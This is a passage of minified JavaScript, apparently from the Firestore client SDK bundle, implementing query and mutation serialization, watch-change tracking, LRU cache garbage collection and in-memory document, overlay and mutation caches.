this.Ge.getRemoteKeysForTarget(e).size+t.addedDocuments.size-t.removedDocuments.size}$e(e){this.nt(e).$e()}nt(e){let t=this.ze.get(e);return t||(t=new JC,this.ze.set(e,t)),t}Rt(e){let t=this.Je.get(e);return t||(t=new at(Ye),this.Je=this.Je.insert(e,t)),t}It(e){let t=this.He.get(e);return t||(t=new at(Ye),this.He=this.He.insert(e,t)),t}rt(e){const t=this.ot(e)!==null;return t||Ee("WatchChangeAggregator","Detected inactive target",e),t}ot(e){const t=this.ze.get(e);return t&&t.Ne?null:this.Ge.At(e)}it(e){this.ze.set(e,new JC),this.Ge.getRemoteKeysForTarget(e).forEach((t=>{this.et(e,t,null)}))}Et(e,t){return this.Ge.getRemoteKeysForTarget(e).has(t)}}function Xd(){return new wa(Le.comparator)}function QC(){return new wa(Le.comparator)}const J2={asc:"ASCENDING",desc:"DESCENDING"},Q2={"<":"LESS_THAN","<=":"LESS_THAN_OR_EQUAL",">":"GREATER_THAN",">=":"GREATER_THAN_OR_EQUAL","==":"EQUAL","!=":"NOT_EQUAL","array-contains":"ARRAY_CONTAINS",in:"IN","not-in":"NOT_IN","array-contains-any":"ARRAY_CONTAINS_ANY"},W2={and:"AND",or:"OR"};class K2{constructor(e,t){this.databaseId=e,this.useProto3Json=t}}function Ag(a,e){return a.useProto3Json||am(e)?e:{value:e}}function wp(a,e){return a.useProto3Json?`${new Date(1e3*e.seconds).toISOString().replace(/\.\d*/,"").replace("Z","")}.${("000000000"+e.nanoseconds).slice(-9)}Z`:{seconds:""+e.seconds,nanos:e.nanoseconds}}function GT(a,e){return a.useProto3Json?e.toBase64():e.toUint8Array()}function $2(a,e){return wp(a,e.toTimestamp())}function bo(a){return ma(!!a,49232),_e.fromTimestamp((function(t){const o=$i(t);return new Pa(o.seconds,o.nanos)})(a))}function hb(a,e){return Tg(a,e).canonicalString()}function Tg(a,e){const t=(function(r){return new Da(["projects",r.projectId,"databases",r.database])})(a).child("documents");return e===void 0?t:t.child(e)}function JT(a){const e=Da.fromString(a);return ma(YT(e),10190,{key:e.toString()}),e}function xg(a,e){return hb(a.databaseId,e.path)}function wh(a,e){const t=JT(e);if(t.get(1)!==a.databaseId.projectId)throw new xe(de.INVALID_ARGUMENT,"Tried to deserialize key from different project: "+t.get(1)+" vs "+a.databaseId.projectId);if(t.get(3)!==a.databaseId.database)throw new xe(de.INVALID_ARGUMENT,"Tried to deserialize key from different database: "+t.get(3)+" vs "+a.databaseId.database);return new Le(WT(t))}function QT(a,e){return hb(a.databaseId,e)}function Y2(a){const e=JT(a);return e.length===4?Da.emptyPath():WT(e)}function jg(a){return new Da(["projects",a.databaseId.projectId,"databases",a.databaseId.database]).canonicalString()}function WT(a){return ma(a.length>4&&a.get(4)==="documents",29091,{key:a.toString()}),a.popFirst(5)}function WC(a,e,t){return{name:xg(a,e),fields:t.value.mapValue.fields}}function X2(a,e){let t;if("targetChange"in e){e.targetChange;const o=(function(p){return p==="NO_CHANGE"?0:p==="ADD"?1:p==="REMOVE"?2:p==="CURRENT"?3:p==="RESET"?4:we(39313,{state:p})})(e.targetChange.targetChangeType||"NO_CHANGE"),r=e.targetChange.targetIds||[],l=(function(p,v){return p.useProto3Json?(ma(v===void 0||typeof v=="string",58123),ft.fromBase64String(v||"")):(ma(v===void 0||v instanceof Buffer||v instanceof Uint8Array,16193),ft.fromUint8Array(v||new Uint8Array))})(a,e.targetChange.resumeToken),c=e.targetChange.cause,d=c&&(function(p){const v=p.code===void 0?de.UNKNOWN:VT(p.code);return new xe(v,p.message||"")})(c);t=new HT(o,r,l,d||null)}else if("documentChange"in e){e.documentChange;const o=e.documentChange;o.document,o.document.name,o.document.updateTime;const r=wh(a,o.document.name),l=bo(o.document.updateTime),c=o.document.createTime?bo(o.document.createTime):_e.min(),d=new vn({mapValue:{fields:o.document.fields}}),f=Et.newFoundDocument(r,l,c,d),p=o.targetIds||[],v=o.removedTargetIds||[];t=new fp(p,v,f.key,f)}else if("documentDelete"in e){e.documentDelete;const o=e.documentDelete;o.document;const r=wh(a,o.document),l=o.readTime?bo(o.readTime):_e.min(),c=Et.newNoDocument(r,l),d=o.removedTargetIds||[];t=new fp([],d,c.key,c)}else if("documentRemove"in e){e.documentRemove;const o=e.documentRemove;o.document;const r=wh(a,o.document),l=o.removedTargetIds||[];t=new fp([],l,r,null)}else{if(!("filter"in e))return we(11601,{Vt:e});{e.filter;const o=e.filter;o.targetId;const{count:r=0,unchangedNames:l}=o,c=new B2(r,l),d=o.targetId;t=new FT(d,c)}}return t}function Z2(a,e){let t;if(e instanceof pu)t={update:WC(a,e.key,e.value)};else if(e instanceof BT)t={delete:xg(a,e.key)};else if(e instanceof Zr)t={update:WC(a,e.key,e.data),updateMask:lI(e.fieldMask)};else{if(!(e instanceof O2))return we(16599,{dt:e.type});t={verify:xg(a,e.key)}}return e.fieldTransforms.length>0&&(t.updateTransforms=e.fieldTransforms.map((o=>(function(l,c){const d=c.transform;if(d instanceof Ip)return{fieldPath:c.field.canonicalString(),setToServerValue:"REQUEST_TIME"};if(d instanceof eu)return{fieldPath:c.field.canonicalString(),appendMissingElements:{values:d.elements}};if(d instanceof au)return{fieldPath:c.field.canonicalString(),removeAllFromArray:{values:d.elements}};if(d instanceof Dp)return{fieldPath:c.field.canonicalString(),increment:d.Ae};throw we(20930,{transform:c.transform})})(0,o)))),e.precondition.isNone||(t.currentDocument=(function(r,l){return l.updateTime!==void 0?{updateTime:$2(r,l.updateTime)}:l.exists!==void 0?{exists:l.exists}:we(27497)})(a,e.precondition)),t}function eI(a,e){return a&&a.length>0?(ma(e!==void 0,14353),a.map((t=>(function(r,l){let c=r.updateTime?bo(r.updateTime):bo(l);return c.isEqual(_e.min())&&(c=bo(l)),new _2(c,r.transformResults||[])})(t,e)))):[]}function aI(a,e){return{documents:[QT(a,e.path)]}}function tI(a,e){const t={structuredQuery:{}},o=e.path;let r;e.collectionGroup!==null?(r=o,t.structuredQuery.from=[{collectionId:e.collectionGroup,allDescendants:!0}]):(r=o.popLast(),t.structuredQuery.from=[{collectionId:o.lastSegment()}]),t.parent=QT(a,r);const l=(function(p){if(p.length!==0)return $T(So.create(p,"and"))})(e.filters);l&&(t.structuredQuery.where=l);const c=(function(p){if(p.length!==0)return p.map((v=>(function(S){return{field:Js(S.field),direction:iI(S.dir)}})(v)))})(e.orderBy);c&&(t.structuredQuery.orderBy=c);const d=Ag(a,e.limit);return d!==null&&(t.structuredQuery.limit=d),e.startAt&&(t.structuredQuery.startAt=(function(p){return{before:p.inclusive,values:p.position}})(e.startAt)),e.endAt&&(t.structuredQuery.endAt=(function(p){return{before:!p.inclusive,values:p.position}})(e.endAt)),{ft:t,parent:r}}function nI(a){let e=Y2(a.parent);const t=a.structuredQuery,o=t.from?t.from.length:0;let r=null;if(o>0){ma(o===1,65062);const v=t.from[0];v.allDescendants?r=v.collectionId:e=e.child(v.collectionId)}let l=[];t.where&&(l=(function(y){const S=KT(y);return S instanceof So&&xT(S)?S.getFilters():[S]})(t.where));let c=[];t.orderBy&&(c=(function(y){return y.map((S=>(function(R){return new Lp(Qs(R.field),(function(x){switch(x){case"ASCENDING":return"asc";case"DESCENDING":return"desc";default:return}})(R.direction))})(S)))})(t.orderBy));let d=null;t.limit&&(d=(function(y){let S;return S=typeof y=="object"?y.value:y,am(S)?null:S})(t.limit));let f=null;t.startAt&&(f=(function(y){const S=!!y.before,A=y.values||[];return new Rp(A,S)})(t.startAt));let p=null;return t.endAt&&(p=(function(y){const S=!y.before,A=y.values||[];return new Rp(A,S)})(t.endAt)),E2(e,r,c,l,d,"F",f,p)}function oI(a,e){const t=(function(r){switch(r){case"TargetPurposeListen":return null;case"TargetPurposeExistenceFilterMismatch":return"existence-filter-mismatch";case"TargetPurposeExistenceFilterMismatchBloom":return"existence-filter-mismatch-bloom";case"TargetPurposeLimboResolution":return"limbo-document";default:return we(28987,{purpose:r})}})(e.purpose);return t==null?null:{"goog-listen-tags":t}}function KT(a){return a.unaryFilter!==void 0?(function(t){switch(t.unaryFilter.op){case"IS_NAN":const o=Qs(t.unaryFilter.field);return Za.create(o,"==",{doubleValue:NaN});case"IS_NULL":const r=Qs(t.unaryFilter.field);return Za.create(r,"==",{nullValue:"NULL_VALUE"});case"IS_NOT_NAN":const l=Qs(t.unaryFilter.field);return Za.create(l,"!=",{doubleValue:NaN});case"IS_NOT_NULL":const c=Qs(t.unaryFilter.field);return Za.create(c,"!=",{nullValue:"NULL_VALUE"});case"OPERATOR_UNSPECIFIED":return we(61313);default:return we(60726)}})(a):a.fieldFilter!==void 0?(function(t){return Za.create(Qs(t.fieldFilter.field),(function(r){switch(r){case"EQUAL":return"==";case"NOT_EQUAL":return"!=";case"GREATER_THAN":return">";case"GREATER_THAN_OR_EQUAL":return">=";case"LESS_THAN":return"<";case"LESS_THAN_OR_EQUAL":return"<=";case"ARRAY_CONTAINS":return"array-contains";case"IN":return"in";case"NOT_IN":return"not-in";case"ARRAY_CONTAINS_ANY":return"array-contains-any";case"OPERATOR_UNSPECIFIED":return we(58110);default:return we(50506)}})(t.fieldFilter.op),t.fieldFilter.value)})(a):a.compositeFilter!==void 0?(function(t){return So.create(t.compositeFilter.filters.map((o=>KT(o))),(function(r){switch(r){case"AND":return"and";case"OR":return"or";default:return we(1026)}})(t.compositeFilter.op))})(a):we(30097,{filter:a})}function iI(a){return J2[a]}function rI(a){return Q2[a]}function sI(a){return W2[a]}function Js(a){return{fieldPath:a.canonicalString()}}function Qs(a){return pt.fromServerFormat(a.fieldPath)}function $T(a){return a instanceof Za?(function(t){if(t.op==="=="){if(_C(t.value))return{unaryFilter:{field:Js(t.field),op:"IS_NAN"}};if(MC(t.value))return{unaryFilter:{field:Js(t.field),op:"IS_NULL"}}}else if(t.op==="!="){if(_C(t.value))return{unaryFilter:{field:Js(t.field),op:"IS_NOT_NAN"}};if(MC(t.value))return{unaryFilter:{field:Js(t.field),op:"IS_NOT_NULL"}}}return{fieldFilter:{field:Js(t.field),op:rI(t.op),value:t.value}}})(a):a instanceof So?(function(t){const o=t.getFilters().map((r=>$T(r)));return o.length===1?o[0]:{compositeFilter:{op:sI(t.op),filters:o}}})(a):we(54877,{filter:a})}function lI(a){const e=[];return a.fields.forEach((t=>e.push(t.canonicalString()))),{fieldPaths:e}}function YT(a){return a.length>=4&&a.get(0)==="projects"&&a.get(2)==="databases"}function XT(a){return!!a&&typeof a._toProto=="function"&&a._protoValueType==="ProtoValue"}class Vi{constructor(e,t,o,r,l=_e.min(),c=_e.min(),d=ft.EMPTY_BYTE_STRING,f=null){this.target=e,this.targetId=t,this.purpose=o,this.sequenceNumber=r,this.snapshotVersion=l,this.lastLimboFreeSnapshotVersion=c,this.resumeToken=d,this.expectedCount=f}withSequenceNumber(e){return new Vi(this.target,this.targetId,this.purpose,e,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,this.expectedCount)}withResumeToken(e,t){return new Vi(this.target,this.targetId,this.purpose,this.sequenceNumber,t,this.lastLimboFreeSnapshotVersion,e,null)}withExpectedCount(e){return new Vi(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,this.lastLimboFreeSnapshotVersion,this.resumeToken,e)}withLastLimboFreeSnapshotVersion(e){return new Vi(this.target,this.targetId,this.purpose,this.sequenceNumber,this.snapshotVersion,e,this.resumeToken,this.expectedCount)}}class cI{constructor(e){this.yt=e}}function uI(a){const e=nI({parent:a.parent,structuredQuery:a.structuredQuery});return a.limitType==="LAST"?Cg(e,e.limit,"L"):e}class dI{constructor(){this.Sn=new pI}addToCollectionParentIndex(e,t){return this.Sn.add(t),ce.resolve()}getCollectionParents(e,t){return ce.resolve(this.Sn.getEntries(t))}addFieldIndex(e,t){return ce.resolve()}deleteFieldIndex(e,t){return ce.resolve()}deleteAllFieldIndexes(e){return ce.resolve()}createTargetIndexes(e,t){return ce.resolve()}getDocumentsMatchingTarget(e,t){return ce.resolve(null)}getIndexType(e,t){return ce.resolve(0)}getFieldIndexes(e,t){return ce.resolve([])}getNextCollectionGroupToUpdate(e){return ce.resolve(null)}getMinOffset(e,t){return ce.resolve(Ki.min())}getMinOffsetFromCollectionGroup(e,t){return ce.resolve(Ki.min())}updateCollectionGroup(e,t,o){return ce.resolve()}updateIndexEntries(e,t){return ce.resolve()}}class pI{constructor(){this.index={}}add(e){const t=e.lastSegment(),o=e.popLast(),r=this.index[t]||new at(Da.comparator),l=!r.has(o);return this.index[t]=r.add(o),l}has(e){const t=e.lastSegment(),o=e.popLast(),r=this.index[t];return r&&r.has(o)}getEntries(e){return(this.index[e]||new at(Da.comparator)).toArray()}}const KC={didRun:!1,sequenceNumbersCollected:0,targetsRemoved:0,documentsRemoved:0},ZT=41943040;class Nt{static withCacheSize(e){return new Nt(e,Nt.DEFAULT_COLLECTION_PERCENTILE,Nt.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT)}constructor(e,t,o){this.cacheSizeCollectionThreshold=e,this.percentileToCollect=t,this.maximumSequenceNumbersToCollect=o}}Nt.DEFAULT_COLLECTION_PERCENTILE=10,Nt.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT=1e3,Nt.DEFAULT=new Nt(ZT,Nt.DEFAULT_COLLECTION_PERCENTILE,Nt.DEFAULT_MAX_SEQUENCE_NUMBERS_TO_COLLECT),Nt.DISABLED=new Nt(-1,0,0);class rl{constructor(e){this.sr=e}next(){return this.sr+=2,this.sr}static _r(){return new rl(0)}static ar(){return new rl(-1)}}const $C="LruGarbageCollector",mI=1048576;function YC([a,e],[t,o]){const r=Ye(a,t);return r===0?Ye(e,o):r}class fI{constructor(e){this.Pr=e,this.buffer=new at(YC),this.Tr=0}Ir(){return++this.Tr}Er(e){const t=[e,this.Ir()];if(this.buffer.size<this.Pr)this.buffer=this.buffer.add(t);else{const o=this.buffer.last();YC(t,o)<0&&(this.buffer=this.buffer.delete(o).add(t))}}get maxValue(){return this.buffer.last()[0]}}class hI{constructor(e,t,o){this.garbageCollector=e,this.asyncQueue=t,this.localStore=o,this.Rr=null}start(){this.garbageCollector.params.cacheSizeCollectionThreshold!==-1&&this.Ar(6e4)}stop(){this.Rr&&(this.Rr.cancel(),this.Rr=null)}get started(){return this.Rr!==null}Ar(e){Ee($C,`Garbage collection scheduled in ${e}ms`),this.Rr=this.asyncQueue.enqueueAfterDelay("lru_garbage_collection",e,(async()=>{this.Rr=null;try{await this.localStore.collectGarbage(this.garbageCollector)}catch(t){ml(t)?Ee($C,"Ignoring IndexedDB error during garbage collection: ",t):await pl(t)}await this.Ar(3e5)}))}}class gI{constructor(e,t){this.Vr=e,this.params=t}calculateTargetCount(e,t){return this.Vr.dr(e).next((o=>Math.floor(t/100*o)))}nthSequenceNumber(e,t){if(t===0)return ce.resolve(em.ce);const o=new fI(t);return this.Vr.forEachTarget(e,(r=>o.Er(r.sequenceNumber))).next((()=>this.Vr.mr(e,(r=>o.Er(r))))).next((()=>o.maxValue))}removeTargets(e,t,o){return this.Vr.removeTargets(e,t,o)}removeOrphanedDocuments(e,t){return this.Vr.removeOrphanedDocuments(e,t)}collect(e,t){return this.params.cacheSizeCollectionThreshold===-1?(Ee("LruGarbageCollector","Garbage collection skipped; disabled"),ce.resolve(KC)):this.getCacheSize(e).next((o=>o<this.params.cacheSizeCollectionThreshold?(Ee("LruGarbageCollector",`Garbage collection skipped; Cache size ${o} is lower than threshold ${this.params.cacheSizeCollectionThreshold}`),KC):this.gr(e,t)))}getCacheSize(e){return this.Vr.getCacheSize(e)}gr(e,t){let o,r,l,c,d,f,p;const v=Date.now();return this.calculateTargetCount(e,this.params.percentileToCollect).next((y=>(y>this.params.maximumSequenceNumbersToCollect?(Ee("LruGarbageCollector",`Capping sequence numbers to collect down to the maximum of ${this.params.maximumSequenceNumbersToCollect} from ${y}`),r=this.params.maximumSequenceNumbersToCollect):r=y,c=Date.now(),this.nthSequenceNumber(e,r)))).next((y=>(o=y,d=Date.now(),this.removeTargets(e,o,t)))).next((y=>(l=y,f=Date.now(),this.removeOrphanedDocuments(e,o)))).next((y=>(p=Date.now(),Hs()<=$e.DEBUG&&Ee("LruGarbageCollector",`LRU Garbage Collection
	Counted targets in ${c-v}ms
	Determined least recently used ${r} in `+(d-c)+`ms
	Removed ${l} targets in `+(f-d)+`ms
	Removed ${y} documents in `+(p-f)+`ms
Total Duration: ${p-v}ms`),ce.resolve({didRun:!0,sequenceNumbersCollected:r,targetsRemoved:l,documentsRemoved:y}))))}}function bI(a,e){return new gI(a,e)}class vI{constructor(){this.changes=new Xr((e=>e.toString()),((e,t)=>e.isEqual(t))),this.changesApplied=!1}addEntry(e){this.assertNotApplied(),this.changes.set(e.key,e)}removeEntry(e,t){this.assertNotApplied(),this.changes.set(e,Et.newInvalidDocument(e).setReadTime(t))}getEntry(e,t){this.assertNotApplied();const o=this.changes.get(t);return o!==void 0?ce.resolve(o):this.getFromCache(e,t)}getEntries(e,t){return this.getAllFromCache(e,t)}apply(e){return this.assertNotApplied(),this.changesApplied=!0,this.applyChanges(e)}assertNotApplied(){}}class yI{constructor(e,t){this.overlayedDocument=e,this.mutatedFields=t}}class EI{constructor(e,t,o,r){this.remoteDocumentCache=e,this.mutationQueue=t,this.documentOverlayCache=o,this.indexManager=r}getDocument(e,t){let o=null;return this.documentOverlayCache.getOverlay(e,t).next((r=>(o=r,this.remoteDocumentCache.getEntry(e,t)))).next((r=>(o!==null&&Fc(o.mutation,r,Mn.empty(),Pa.now()),r)))}getDocuments(e,t){return this.remoteDocumentCache.getEntries(e,t).next((o=>this.getLocalViewOfDocuments(e,o,Xe()).next((()=>o))))}getLocalViewOfDocuments(e,t,o=Xe()){const r=zr();return this.populateOverlays(e,r,t).next((()=>this.computeViews(e,t,r,o).next((l=>{let c=kc();return l.forEach(((d,f)=>{c=c.insert(d,f.overlayedDocument)})),c}))))}getOverlayedDocuments(e,t){const o=zr();return this.populateOverlays(e,o,t).next((()=>this.computeViews(e,t,o,Xe())))}populateOverlays(e,t,o){const r=[];return o.forEach((l=>{t.has(l)||r.push(l)})),this.documentOverlayCache.getOverlays(e,r).next((l=>{l.forEach(((c,d)=>{t.set(c,d)}))}))}computeViews(e,t,o,r){let l=ei();const c=Vc(),d=(function(){return Vc()})();return t.forEach(((f,p)=>{const v=o.get(p.key);r.has(p.key)&&(v===void 0||v.mutation instanceof Zr)?l=l.insert(p.key,p):v!==void 0?(c.set(p.key,v.mutation.getFieldMask()),Fc(v.mutation,p,v.mutation.getFieldMask(),Pa.now())):c.set(p.key,Mn.empty())})),this.recalculateAndSaveOverlays(e,l).next((f=>(f.forEach(((p,v)=>c.set(p,v))),t.forEach(((p,v)=>d.set(p,new yI(v,c.get(p)??null)))),d)))}recalculateAndSaveOverlays(e,t){const o=Vc();let r=new wa(((c,d)=>c-d)),l=Xe();return this.mutationQueue.getAllMutationBatchesAffectingDocumentKeys(e,t).next((c=>{for(const d of c)d.keys().forEach((f=>{const p=t.get(f);if(p===null)return;let v=o.get(f)||Mn.empty();v=d.applyToLocalView(p,v),o.set(f,v);const y=(r.get(d.batchId)||Xe()).add(f);r=r.insert(d.batchId,y)}))})).next((()=>{const c=[],d=r.getReverseIterator();for(;d.hasNext();){const f=d.getNext(),p=f.key,v=f.value,y=wT();v.forEach((S=>{if(!l.has(S)){const A=zT(t.get(S),o.get(S));A!==null&&y.set(S,A),l=l.add(S)}})),c.push(this.documentOverlayCache.saveOverlays(e,p,y))}return ce.waitFor(c)})).next((()=>o))}recalculateAndSaveOverlaysForDocumentKeys(e,t){return this.remoteDocumentCache.getEntries(e,t).next((o=>this.recalculateAndSaveOverlays(e,o)))}getDocumentsMatchingQuery(e,t,o,r){return S2(t)?this.getDocumentsMatchingDocumentQuery(e,t.path):C2(t)?this.getDocumentsMatchingCollectionGroupQuery(e,t,o,r):this.getDocumentsMatchingCollectionQuery(e,t,o,r)}getNextDocuments(e,t,o,r){return this.remoteDocumentCache.getAllFromCollectionGroup(e,t,o,r).next((l=>{const c=r-l.size>0?this.documentOverlayCache.getOverlaysForCollectionGroup(e,t,o.largestBatchId,r-l.size):ce.resolve(zr());let d=$c,f=l;return c.next((p=>ce.forEach(p,((v,y)=>(d<y.largestBatchId&&(d=y.largestBatchId),l.get(v)?ce.resolve():this.remoteDocumentCache.getEntry(e,v).next((S=>{f=f.insert(v,S)}))))).next((()=>this.populateOverlays(e,p,l))).next((()=>this.computeViews(e,f,p,Xe()))).next((v=>({batchId:d,changes:DT(v)})))))}))}getDocumentsMatchingDocumentQuery(e,t){return this.getDocument(e,new Le(t)).next((o=>{let r=kc();return o.isFoundDocument()&&(r=r.insert(o.key,o)),r}))}getDocumentsMatchingCollectionGroupQuery(e,t,o,r){const l=t.collectionGroup;let c=kc();return this.indexManager.getCollectionParents(e,l).next((d=>ce.forEach(d,(f=>{const p=(function(y,S){return new nm(S,null,y.explicitOrderBy.slice(),y.filters.slice(),y.limit,y.limitType,y.startAt,y.endAt)})(t,f.child(l));return this.getDocumentsMatchingCollectionQuery(e,p,o,r).next((v=>{v.forEach(((y,S)=>{c=c.insert(y,S)}))}))})).next((()=>c))))}getDocumentsMatchingCollectionQuery(e,t,o,r){let l;return this.documentOverlayCache.getOverlaysForCollection(e,t.path,o.largestBatchId).next((c=>(l=c,this.remoteDocumentCache.getDocumentsMatchingQuery(e,t,o,l,r)))).next((c=>{l.forEach(((f,p)=>{const v=p.getKey();c.get(v)===null&&(c=c.insert(v,Et.newInvalidDocument(v)))}));let d=kc();return c.forEach(((f,p)=>{const v=l.get(f);v!==void 0&&Fc(v.mutation,p,Mn.empty(),Pa.now()),rm(t,p)&&(d=d.insert(f,p))})),d}))}}class SI{constructor(e){this.serializer=e,this.Nr=new Map,this.Br=new Map}getBundleMetadata(e,t){return ce.resolve(this.Nr.get(t))}saveBundleMetadata(e,t){return this.Nr.set(t.id,(function(r){return{id:r.id,version:r.version,createTime:bo(r.createTime)}})(t)),ce.resolve()}getNamedQuery(e,t){return ce.resolve(this.Br.get(t))}saveNamedQuery(e,t){return this.Br.set(t.name,(function(r){return{name:r.name,query:uI(r.bundledQuery),readTime:bo(r.readTime)}})(t)),ce.resolve()}}class CI{constructor(){this.overlays=new wa(Le.comparator),this.Lr=new Map}getOverlay(e,t){return ce.resolve(this.overlays.get(t))}getOverlays(e,t){const o=zr();return ce.forEach(t,(r=>this.getOverlay(e,r).next((l=>{l!==null&&o.set(r,l)})))).next((()=>o))}saveOverlays(e,t,o){return o.forEach(((r,l)=>{this.bt(e,t,l)})),ce.resolve()}removeOverlaysForBatchId(e,t,o){const r=this.Lr.get(o);return r!==void 0&&(r.forEach((l=>this.overlays=this.overlays.remove(l))),this.Lr.delete(o)),ce.resolve()}getOverlaysForCollection(e,t,o){const r=zr(),l=t.length+1,c=new Le(t.child("")),d=this.overlays.getIteratorFrom(c);for(;d.hasNext();){const f=d.getNext().value,p=f.getKey();if(!t.isPrefixOf(p.path))break;p.path.length===l&&f.largestBatchId>o&&r.set(f.getKey(),f)}return ce.resolve(r)}getOverlaysForCollectionGroup(e,t,o,r){let l=new wa(((p,v)=>p-v));const c=this.overlays.getIterator();for(;c.hasNext();){const p=c.getNext().value;if(p.getKey().getCollectionGroup()===t&&p.largestBatchId>o){let v=l.get(p.largestBatchId);v===null&&(v=zr(),l=l.insert(p.largestBatchId,v)),v.set(p.getKey(),p)}}const d=zr(),f=l.getIterator();for(;f.hasNext()&&(f.getNext().value.forEach(((p,v)=>d.set(p,v))),!(d.size()>=r)););return ce.resolve(d)}bt(e,t,o){const r=this.overlays.get(o.key);if(r!==null){const c=this.Lr.get(r.largestBatchId).delete(o.key);this.Lr.set(r.largestBatchId,c)}this.overlays=this.overlays.insert(o.key,new U2(t,o));let l=this.Lr.get(t);l===void 0&&(l=Xe(),this.Lr.set(t,l)),this.Lr.set(t,l.add(o.key))}}class AI{constructor(){this.sessionToken=ft.EMPTY_BYTE_STRING}getSessionToken(e){return ce.resolve(this.sessionToken)}setSessionToken(e,t){return this.sessionToken=t,ce.resolve()}}class gb{constructor(){this.kr=new at(it.Kr),this.qr=new at(it.Ur)}isEmpty(){return this.kr.isEmpty()}addReference(e,t){const o=new it(e,t);this.kr=this.kr.add(o),this.qr=this.qr.add(o)}$r(e,t){e.forEach((o=>this.addReference(o,t)))}removeReference(e,t){this.Wr(new it(e,t))}Qr(e,t){e.forEach((o=>this.removeReference(o,t)))}Gr(e){const t=new Le(new Da([])),o=new it(t,e),r=new it(t,e+1),l=[];return this.qr.forEachInRange([o,r],(c=>{this.Wr(c),l.push(c.key)})),l}zr(){this.kr.forEach((e=>this.Wr(e)))}Wr(e){this.kr=this.kr.delete(e),this.qr=this.qr.delete(e)}jr(e){const t=new Le(new Da([])),o=new it(t,e),r=new it(t,e+1);let l=Xe();return this.qr.forEachInRange([o,r],(c=>{l=l.add(c.key)})),l}containsKey(e){const t=new it(e,0),o=this.kr.firstAfterOrEqual(t);return o!==null&&e.isEqual(o.key)}}class it{constructor(e,t){this.key=e,this.Hr=t}static Kr(e,t){return Le.comparator(e.key,t.key)||Ye(e.Hr,t.Hr)}static Ur(e,t){return Ye(e.Hr,t.Hr)||Le.comparator(e.key,t.key)}}class TI{constructor(e,t){this.indexManager=e,this.referenceDelegate=t,this.mutationQueue=[],this.Yn=1,this.Jr=new at(it.Kr)}checkEmpty(e){return ce.resolve(this.mutationQueue.length===0)}addMutationBatch(e,t,o,r){const l=this.Yn;this.Yn++,this.mutationQueue.length>0&&this.mutationQueue[this.mutationQueue.length-1];const c=new z2(l,t,o,r);this.mutationQueue.push(c);for(const d of r)this.Jr=this.Jr.add(new it(d.key,l)),this.indexManager.addToCollectionParentIndex(e,d.key.path.popLast());return ce.resolve(c)}lookupMutationBatch(e,t){return ce.resolve(this.Zr(t))}getNextMutationBatchAfterBatchId(e,t){const o=t+1,r=this.Xr(o),l=r<0?0:r;return ce.resolve(this.mutationQueue.length>l?this.mutationQueue[l]:null)}getHighestUnacknowledgedBatchId(){return ce.resolve(this.mutationQueue.length===0?sb:this.Yn-1)}getAllMutationBatches(e){return ce.resolve(this.mutationQueue.slice())}getAllMutationBatchesAffectingDocumentKey(e,t){const o=new it(t,0),r=new it(t,Number.POSITIVE_INFINITY),l=[];return this.Jr.forEachInRange([o,r],(c=>{const d=this.Zr(c.Hr);l.push(d)})),ce.resolve(l)}getAllMutationBatchesAffectingDocumentKeys(e,t){let o=new at(Ye);return t.forEach((r=>{const l=new it(r,0),c=new it(r,Number.POSITIVE_INFINITY);this.Jr.forEachInRange([l,c],(d=>{o=o.add(d.Hr)}))})),ce.resolve(this.Yr(o))}getAllMutationBatchesAffectingQuery(e,t){const o=t.path,r=o.length+1;let l=o;Le.isDocumentKey(l)||(l=l.child(""));const c=new it(new Le(l),0);let d=new at(Ye);return this.Jr.forEachWhile((f=>{const p=f.key.path;return!!o.isPrefixOf(p)&&(p.length===r&&(d=d.add(f.Hr)),!0)}),c),ce.resolve(this.Yr(d))}Yr(e){const t=[];return e.forEach((o=>{const r=this.Zr(o);r!==null&&t.push(r)})),t}removeMutationBatch(e,t){ma(this.ei(t.batchId,"removed")===0,55003),this.mutationQueue.shift();let o=this.Jr;return ce.forEach(t.mutations,(r=>{const l=new it(r.key,t.batchId);return o=o.delete(l),this.referenceDelegate.markPotentiallyOrphaned(e,r.key)})).next((()=>{this.Jr=o}))}nr(e){}containsKey(e,t){const o=new it(t,0),r=this.Jr.firstAfterOrEqual(o);return ce.resolve(t.isEqual(r&&r.key))}performConsistencyCheck(e){return this.mutationQueue.length,ce.resolve()}ei(e,t){return this.Xr(e)}Xr(e){return this.mutationQueue.length===0?0:e-this.mutationQueue[0].batchId}Zr(e){const t=this.Xr(e);return t<0||t>=this.mutationQueue.length?null:this.mutationQueue[t]}}class xI{constructor(e){this.ti=e,this.docs=(function(){return new wa(Le.comparator)})(),this.size=0}setIndexManager(e){this.indexManager=e}addEntry(e,t){const o=t.key,r=this.docs.get(o),l=r?r.size:0,c=this.ti(t);return this.docs=this.docs.insert(o,{document:t.mutableCopy(),size:c}),this.size+=c-l,this.indexManager.addToCollectionParentIndex(e,o.path.popLast())}removeEntry(e){const t=this.docs.get(e);t&&(this.docs=this.docs.remove(e),this.size-=t.size)}getEntry(e,t){const o=this.docs.get(t);return ce.resolve(o?o.document.mutableCopy():Et.newInvalidDocument(t))}getEntries(e,t){let o=ei();return t.forEach((r=>{const l=this.docs.get(r);o=o.insert(r,l?l.document.mutableCopy():Et.newInvalidDocument(r))})),ce.resolve(o)}getDocumentsMatchingQuery(e,t,o,r){let l=ei();const c=t.path,d=new Le(c.child("__id-9223372036854775808__")),f=this.docs.getIteratorFrom(d);for(;f.hasNext();){const{key:p,value:{document:v}}=f.getNext();if(!c.isPrefixOf(p.path))break;p.path.length>c.length+1||YL($L(v),o)<=0||(r.has(v.key)||rm(t,v))&&(l=l.insert(v.key,v.mutableCopy()))}return ce.resolve(l)}getAllFromCollectionGroup(e,t,o,r){we(9500)}ni(e,t){return ce.forEach(this.docs,(o=>t(o)))}newChangeBuffer(e){return new jI(this)}getSize(e){return ce.resolve(this.size)}}class jI extends vI{constructor(e){super(),this.Mr=e}applyChanges(e){const t=[];return this.changes.forEach(((o,r)=>{r.isValidDocument()?t.push(this.Mr.addEntry(e,r)):this.Mr.removeEntry(o)})),ce.waitFor(t)}getFromCache(e,t){return this.Mr.getEntry(e,t)}getAllFromCache(e,t){return this.Mr.getEntries(e,t)}}class PI{constructor(e){this.persistence=e,this.ri=new Xr((t=>ub(t)),db),this.lastRemoteSnapshotVersion=_e.min(),this.highestTargetId=0,this.ii=0,this.si=new gb,this.targetCount=0,this.oi=rl._r()}forEachTarget(e,t){return 